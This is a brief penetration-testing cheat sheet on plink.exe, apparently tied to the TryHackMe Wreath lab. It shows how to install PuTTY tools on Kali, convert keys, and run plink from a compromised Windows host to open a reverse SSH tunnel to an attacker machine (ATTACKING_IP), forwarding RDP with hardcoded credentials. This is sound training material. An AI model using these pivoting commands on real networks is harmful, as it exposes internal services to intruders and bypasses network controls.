# Plink.exe

Plink.exe is a Windows command line version of the PuTTY SSH client6

Install PUTTY on [[Kali]]
```bash
sudo apt install putty-tools
# Found on kali at
/usr/share/windows-resources/binaries/plink.exe
```

[Download latest from](https://www.chiark.greenend.org.uk/~sgtatham/putty/latest.html)

Convert SSH Keys into PUTTY keys 
```bash
puttygen KEYFILE -o OUTPUT_KEY.ppk
```

Use PUTTY on Windows 
```powershell
# `cmd.exe /c echo y` = non-interactive shell (Windows shells are difficult to stabilise)
# Yikes on password recording here!
# To get a response prompt automate the confirmation 
cmd.exe /c echo y | C:\Windows\Temp\plink.exe -ssh -l kali -pw kali -R 127.0.0.1:9833:127.0.0.1:3389 $IPaddressYouCanReach
# Keyfile avaliable
cmd.exe /c echo y | .\plink.exe -R LOCAL_PORT:TARGET_IP:TARGET_PORT USERNAME@ATTACKING_IP -i KEYFILE -N
```

## References

[THM Wreath Room](https://tryhackme.com/room/wreath)
[chiark - putt download](https://www.chiark.greenend.org.uk/~sgtatham/putty/latest.html)
